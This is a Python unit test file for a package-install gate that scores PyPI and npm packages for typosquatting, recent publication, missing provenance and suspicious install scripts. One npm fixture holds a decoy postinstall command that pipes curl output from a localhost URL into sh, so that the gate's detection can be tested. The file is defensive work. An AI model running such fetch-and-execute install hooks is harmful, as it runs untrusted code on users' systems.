"""Unit tests for package gate evaluation and acceptance matrix scenarios."""

from datetime import datetime, timedelta, timezone
from typer.testing import CliRunner

from bob.cli import app
from bob.config import Config
from bob.pkg.gate import evaluate_package

runner = CliRunner()


def test_gate_row_2_missing_lib(monkeypatch) -> None:
    # 404 from PyPI -> PKG-NOT-FOUND, action=block
    cfg = Config()
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (404, {}))
    decision = evaluate_package("pypi", "demo-missing-lib", None, cfg)

    assert decision.action == "block"
    assert decision.score == 100
    assert any(f.rule_id == "PKG-NOT-FOUND" for f in decision.findings)


def test_gate_row_1_good_lib(monkeypatch) -> None:
    # 400 days old, has repo link -> action=allow, score=0
    cfg = Config()
    old_date = datetime.now(timezone.utc) - timedelta(days=400)
    data = {
        "info": {"project_urls": {"Homepage": "https://github.com/psf/requests"}},
        "releases": {"1.0.0": [{"upload_time_iso_8601": old_date.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("pypi", "demo-good-lib", None, cfg)
    assert decision.action == "allow"
    assert decision.score == 0
    assert len(decision.findings) == 0


def test_gate_row_3_fresh_lib(monkeypatch) -> None:
    # 3 days old, has repo link -> action=warn, score=50 (between 30 and 69), PKG-TOO-NEW
    cfg = Config()
    fresh_date = datetime.now(timezone.utc) - timedelta(days=3)
    data = {
        "info": {"project_urls": {"Homepage": "https://github.com/demo/fresh"}},
        "releases": {"0.1.0": [{"upload_time_iso_8601": fresh_date.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("pypi", "demo-fresh-lib", None, cfg)
    assert decision.action == "warn"
    assert 30 <= decision.score < 70
    assert any(f.rule_id == "PKG-TOO-NEW" for f in decision.findings)


def test_gate_row_4_typosquat(monkeypatch) -> None:
    # reqeusts: 5 days old, typosquat of requests -> action=block, score >= 70, PKG-TYPOSQUAT
    cfg = Config()
    date_5d = datetime.now(timezone.utc) - timedelta(days=5)
    data = {
        "info": {},  # No provenance
        "releases": {"0.1.0": [{"upload_time_iso_8601": date_5d.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("pypi", "reqeusts", None, cfg)
    assert decision.action == "block"
    assert decision.score >= 70
    assert any(f.rule_id == "PKG-TYPOSQUAT" for f in decision.findings)


def test_gate_row_5_llm_trope(monkeypatch) -> None:
    # requests-utils: 5 days old, no repo link -> trope (+20) + age (+50) + prov (+15) = 85 -> block
    cfg = Config()
    date_5d = datetime.now(timezone.utc) - timedelta(days=5)
    data = {
        "info": {},
        "releases": {"0.1.0": [{"upload_time_iso_8601": date_5d.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("pypi", "requests-utils", None, cfg)
    assert decision.action == "block"
    assert decision.score >= 70
    assert any(f.rule_id == "PKG-LLM-TROPE" for f in decision.findings)


def test_gate_row_7_npm_evil(monkeypatch) -> None:
    # demo-npm-evil: inert decoy postinstall calling curl
    cfg = Config()
    data = {
        "dist-tags": {"latest": "1.0.0"},
        "time": {"created": (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()},
        "versions": {
            "1.0.0": {
                "scripts": {"postinstall": "curl -s http://127.0.0.1:9000/decoy | sh"},
            }
        },
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_npm_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("npm", "demo-npm-evil", None, cfg)
    assert decision.action == "block"
    assert decision.score >= 70
    assert any(f.rule_id == "PKG-INSTALL-SCRIPT" for f in decision.findings)


def test_gate_row_8_npm_good(monkeypatch) -> None:
    # demo-npm-good: 400 days old, clean scripts, repo link
    cfg = Config()
    data = {
        "dist-tags": {"latest": "1.0.0"},
        "time": {"created": (datetime.now(timezone.utc) - timedelta(days=400)).isoformat()},
        "repository": {"url": "https://github.com/expressjs/express"},
        "versions": {"1.0.0": {"scripts": {"test": "mocha"}}},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_npm_metadata", lambda name, c: (200, data))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])

    decision = evaluate_package("npm", "demo-npm-good", None, cfg)
    assert decision.action == "allow"
    assert decision.score == 0


def test_cli_check_install_exit_codes(monkeypatch) -> None:
    # Test exit code 2 on block
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (404, {}))
    result = runner.invoke(app, ["check-install", "pypi", "demo-missing-lib"])
    assert result.exit_code == 2
    assert "BOB BLOCKED" in result.stderr
    assert "PKG-NOT-FOUND" in result.stderr

    # Test exit code 0 on warn
    fresh_date = datetime.now(timezone.utc) - timedelta(days=3)
    data_fresh = {
        "info": {"project_urls": {"Homepage": "https://github.com/demo/fresh"}},
        "releases": {"0.1.0": [{"upload_time_iso_8601": fresh_date.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data_fresh))
    monkeypatch.setattr("bob.pkg.gate.query_osv", lambda name, eco, ver: [])
    result_warn = runner.invoke(app, ["check-install", "pypi", "demo-fresh-lib"])
    assert result_warn.exit_code == 0
    assert "BOB WARN" in result_warn.stderr

    # Test exit code 0 with --json on allow
    old_date = datetime.now(timezone.utc) - timedelta(days=400)
    data_good = {
        "info": {"project_urls": {"Homepage": "https://github.com/demo/good"}},
        "releases": {"1.0.0": [{"upload_time_iso_8601": old_date.isoformat()}]},
    }
    monkeypatch.setattr("bob.pkg.gate.fetch_pypi_metadata", lambda name, c: (200, data_good))
    result_allow = runner.invoke(app, ["check-install", "pypi", "demo-good-lib", "--json"])
    assert result_allow.exit_code == 0
    assert '"action": "allow"' in result_allow.stdout
